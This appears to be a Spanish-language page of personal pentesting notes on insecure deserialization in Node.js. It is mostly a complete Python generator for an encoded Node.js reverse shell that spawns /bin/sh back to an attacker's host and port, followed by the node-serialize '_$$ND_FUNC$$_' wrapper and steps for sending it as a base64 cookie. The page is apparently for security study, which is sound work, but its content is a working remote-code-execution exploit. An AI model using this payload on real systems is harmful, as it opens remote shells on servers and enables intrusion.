<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Insecure Deserialization</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Insecure Deserialization</h1><br/>Cuando un servidor deserealiza un dato serializado podemos injectar un codigo serializado mediante la cookie, para que cuando el servidor lo deserealize ejecute el comando<br /><br /><div class="codebox"><div class="codebox">#!/usr/bin/python<br />#&nbsp;Generator&nbsp;for&nbsp;encoded&nbsp;NodeJS&nbsp;reverse&nbsp;shells<br />#&nbsp;Based&nbsp;on&nbsp;the&nbsp;NodeJS&nbsp;reverse&nbsp;shell&nbsp;by&nbsp;Evilpacket<br />#&nbsp;https://github.com/evilpacket/node-shells/blob/master/node_revshell.js<br />#&nbsp;Onelineified&nbsp;and&nbsp;suchlike&nbsp;by&nbsp;infodox&nbsp;(and&nbsp;felicity,&nbsp;who&nbsp;sat&nbsp;on&nbsp;the&nbsp;keyboard)<br />#&nbsp;Insecurety&nbsp;Research&nbsp;(2013)&nbsp;-&nbsp;insecurety.net<br />import&nbsp;sys<br /><br />if&nbsp;len(sys.argv)&nbsp;!=&nbsp;3:<br />&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;Usage:&nbsp;%s&nbsp;&lt;LHOST&gt;&nbsp;&lt;LPORT&gt;&quot;&nbsp;%&nbsp;(sys.argv[0])<br />&nbsp;&nbsp;&nbsp;&nbsp;sys.exit(0)<br /><br />IP_ADDR&nbsp;=&nbsp;sys.argv[1]<br />PORT&nbsp;=&nbsp;sys.argv[2]<br /><br /><br />def&nbsp;charencode(string):<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;String.CharCode&quot;&quot;&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;encoded&nbsp;=&nbsp;&#39;&#39;<br />&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;char&nbsp;in&nbsp;string:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;encoded&nbsp;=&nbsp;encoded&nbsp;+&nbsp;&quot;,&quot;&nbsp;+&nbsp;str(ord(char))<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;encoded[1:]<br /><br />print&nbsp;&quot;[+]&nbsp;LHOST&nbsp;=&nbsp;%s&quot;&nbsp;%&nbsp;(IP_ADDR)<br />print&nbsp;&quot;[+]&nbsp;LPORT&nbsp;=&nbsp;%s&quot;&nbsp;%&nbsp;(PORT)<br />NODEJS_REV_SHELL&nbsp;=&nbsp;&#39;&#39;&#39;<br />var&nbsp;net&nbsp;=&nbsp;require(&#39;net&#39;);<br />var&nbsp;spawn&nbsp;=&nbsp;require(&#39;child_process&#39;).spawn;<br />HOST=&quot;%s&quot;;<br />PORT=&quot;%s&quot;;<br />TIMEOUT=&quot;5000&quot;;<br />if&nbsp;(typeof&nbsp;String.prototype.contains&nbsp;===&nbsp;&#39;undefined&#39;)&nbsp;{&nbsp;String.prototype.contains&nbsp;=&nbsp;function(it)&nbsp;{&nbsp;return&nbsp;this.indexOf(it)&nbsp;!=&nbsp;-1;&nbsp;};&nbsp;}<br />function&nbsp;c(HOST,PORT)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;client&nbsp;=&nbsp;new&nbsp;net.Socket();<br />&nbsp;&nbsp;&nbsp;&nbsp;client.connect(PORT,&nbsp;HOST,&nbsp;function()&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;sh&nbsp;=&nbsp;spawn(&#39;/bin/sh&#39;,[]);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;client.write(&quot;Connected!\\n&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;client.pipe(sh.stdin);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sh.stdout.pipe(client);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sh.stderr.pipe(client);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sh.on(&#39;exit&#39;,function(code,signal){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;client.end(&quot;Disconnected!\\n&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;});<br />&nbsp;&nbsp;&nbsp;&nbsp;});<br />&nbsp;&nbsp;&nbsp;&nbsp;client.on(&#39;error&#39;,&nbsp;function(e)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setTimeout(c(HOST,PORT),&nbsp;TIMEOUT);<br />&nbsp;&nbsp;&nbsp;&nbsp;});<br />}<br />c(HOST,PORT);<br />&#39;&#39;&#39;&nbsp;%&nbsp;(IP_ADDR,&nbsp;PORT)<br />print&nbsp;&quot;[+]&nbsp;Encoding&quot;<br />PAYLOAD&nbsp;=&nbsp;charencode(NODEJS_REV_SHELL)<br />print&nbsp;&quot;eval(String.fromCharCode(%s))&quot;&nbsp;%&nbsp;(PAYLOAD)</div></div><br /><br />En este caso ejecutaremos el script y nos dara los datos encodeados, ahora deberemos crear una funcion con node que lo interprete<br /><br /><div class="codebox"><div class="codebox">{&quot;rce&quot;:&quot;_$$ND_FUNC$$_function(){aqui&nbsp;dentro&nbsp;va&nbsp;el&nbsp;codigo}()&quot;}</div></div><br /><br />Por ultimo para cambiar la cookie guardamos la funcion anterior en un archivo y lo convertimos en base64 y lo enviamos al servidor<br /><br /><br />LINKS INTERES:<br /><br /><a href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py">https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py</a> â†’ Repositorio nodejsshell.py<br /><br /><br /><br /><br /><a href="Explotacion.html">Volver al indice</a></div>
</body>
</html>
